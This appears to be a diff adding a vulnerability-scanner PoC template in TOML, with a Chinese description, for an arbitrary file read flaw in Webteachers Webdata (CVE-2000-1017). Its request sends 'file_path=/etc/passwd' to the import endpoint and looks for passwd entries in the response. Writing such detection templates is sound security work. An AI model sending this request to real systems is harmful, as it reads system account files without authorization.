@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "检测 Webteachers Webdata 是否存在任意文件读取漏洞。具有有效账户的攻击者可通过向导入功能发送特制 POST 请求，将服务器上低于 Web 根目录的任意文件导入数据库，导致敏感信息泄露。"
+id = "POC-AVE-2000-1051"
+name = "Webteachers Webdata 任意文件读取漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-1051"]
+vuln_id = [
+    "CVE-2000-1017",
+    "AVE-2000-1051",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/webdata/import"
+protocol = "http"
+
+[poc.requests.body]
+content = "file_path=/etc/passwd&action=import"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "nobody:",
+    "daemon:",
+]
